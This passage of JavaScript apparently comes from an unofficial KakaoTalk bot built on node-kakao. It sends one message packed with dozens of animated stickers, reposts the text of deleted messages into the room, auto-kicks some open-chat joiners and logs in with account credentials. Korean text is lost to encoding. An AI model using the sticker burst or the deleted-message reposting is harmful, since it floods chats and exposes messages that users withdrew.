        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":10,"height":10,"type":""}',
        },
        ],
                    }))
                    .build(24)
                );
            } catch (error) {
        console.log(error)
            }
        }

    }

});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}





CLIENT.on('error', (err) => {
});

CLIENT.on('disconnected', (reason) => {
    console.log('\n????????? ???????????????.');
});

CLIENT.on('chat_deleted', (feedChatLog, channel, feed) => {
    chatInfo(channel, feed.logId).then(x => console.log("?????? ????????? ?????????\n  " + x.text)).catch(console.log);
    if (dlog == true) {
        setTimeout(function () {
            chatInfo(channel, feed.logId).then(x => channel.sendChat("?????? ????????? ????????? : " + x.text)).catch(console.log);
        }, 1000);
        }
});

async function chatInfo(channel, id) { const chat = await channel.chatListStore.get(id); return chat; }




//CLIENT.on('profile_changed', (channel, lastInfo, user) => {
//channel.sendChat(`${user.nickname}?????? ???????????? ????????????????????? \n\n ??? ????????? : ${lastInfo.nickname} \n??? ?????????: \n${lastInfo.profileURL}`);
//});

    CLIENT.channelList.normal.on('user_join', (joinLog, channel, user, feed) => {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "type": "animated-sticker/digital-item",
                "url": "4412008.emot_009.webp",
                "name": "(????????????)",
                "sound": "",
                "width": "360",
                "height": "360",
                "msg": "",
                "alt": "????????? ????????????"
             })).build(20)
        );
        })
        CLIENT.channelList.open.on('user_left', (joinLog, channel, user, feed) => {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "",
                    "Q": "?????? ??????",
                    "V": "list",
                    "I": "",
                    "F": {
                        "BU": [
                            {
                                "T": "",
                                "L": "",
                                "TP": "more"
                            }
                        ]
                    },
                    "R": [
                        {
                            "T": "[ " + `${user.nickname}` + " ]",
                            "D":  channel.getChannelInfo2() + 1 + " ==> " + channel.getChannelInfo2(),
                            "I": "",
                            "L": "",
                            "W": 216,
                            "H": 216
                        },
                    ]
                }))
                    .build(23)
            )
            })
    CLIENT.channelList.normal.on('user_left', (joinLog, channel, user, feed) => {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "type": "animated-sticker/digital-item",
                "url": "4412008.emot_004.webp",
                "name": "(????????????)",
                "sound": "",
                "width": "360",
                "height": "360",
                "msg": "",
                "alt": "????????? ????????????"
             })).build(20)
        );
        })

    CLIENT.channelList.open.on('user_join', (joinLog, channel, user, feed) => {
        if( roomId != "18342166704610845" ) {
            if(isNaN(channel.getUserInfo({ userId: user.userId }).linkId)) {
                channel.sendChat("?????? ???????????? ?????? ??? ????????? ???????????????!")
        channel.kickUser2(user.userId)
        var unbanUserObj = { userId: user.userId };
        channel.removeKicked(unbanUserObj);
    }}    
});
    CLIENT.channelList.open.on('user_join', (joinLog, channel, user, feed) => {
                channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "?????? ??????",
                "V": "list",
                "I": "",
                "F": {
                    "BU": [
                        {
                            "T": "",
                            "L": "",
                            "TP": "more"
                        }
                    ]
                },
                "R": [
                    {
                        "T": "[ " + `${user.nickname}` + " ]",
                        "D": channel.getChannelInfo2() - 1 + " ==> " + channel.getChannelInfo2(),
                        "I": channel.getUserInfo({ userId: `${user.userId}` }).originalProfileURL,
                        "L": "",
                        "W": 216,
                        "H": 216
                    }
                ]
            }))
                .build(23)
        )
 //       channel.sendChat("????????? ?????? ????????????\n\n20??? ?????? ???????????? V??? ??????????????????!\n")
//join.push(user.userId)
  //      setTimeout(function () {
    //        if(join.includes(user.userId)) {
  //          channel.sendChat("?????? ????????? ???????????? ?????? ????????? ???????????????!")
   //             for (var getValueFor = 0; getValueFor < join.length; getValueFor++) {
   //                      join.splice(getValueFor);
    //                }}
    //                try{
    //            channel.kickUser2(user.userId)
     //               } catch(e) {
    //                    channel.sendChat(e)
   //                 }
   //         }
   //     }, 20000);
    });



  //  CLIENT.on('meta_change', (channel, type, newMeta) => {
   //     if (type == '3') {
     //       try{
    //        if ($TitleSpamList[channel.channelId] != false) {
    //            channel.setTitleMeta($TitleSpamList[channel.channelId]);
    //        }
  ///      } catch(error) {
 //          console(error)
   //         return
  //      }
 //       }
///    });





async function main() {
    const api = await node_kakao.AuthApiClient.create(deviceName, deviceUUID);
    const form = {
        email: email,
        password: pw,
    }
 
    let loginRes = await api.login(form);
    if (!loginRes.success) {
        if (loginRes.status == -100) {
            loginRes = null;
            console.log("\n\nRequesting Verify Code..");
            const passcodeRes = await api.requestPasscode(form);
            if (!passcodeRes.success) {
                console.log("\nFaild doing request the verify code! Error code: " + passcodeRes.status);
            }
            let rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });

            let passcode = await new Promise(resolve => rl.question("Verify Code: ", resolve));
            rl.close();
            const registerRes = await api.registerDevice(form, passcode, true);
            if (!registerRes.success) {
                console.log("\n\nFaild doing verify device. Error Code: " + registerRes.status);
            }

            console.log("\n\nFinished register device '" + deviceUUID + "'");
            loginRes = await api.login(form);
            if (!loginRes.success) {
                console.log("\n\nFaild Login, Error code: " + loginRes.status + "\n????????? ??????????????????.");
            }
            console.log("\n\nLogged In!\n\n");
        } else {
            console.log("\n\nFaild Login, Error code: " + loginRes.status + "\nClosing Program")
        }
    }

    

    const res = await CLIENT.login(loginRes.result);
    if (!res.success) throw new Error(`Login failed with status: ${res.status}`);
    console.log('\nLogin! start DevPlus - bot v1 \n welcome!');
    accountUserId = loginRes.result.userId;
    }


async function start() {
    await main();
}


start();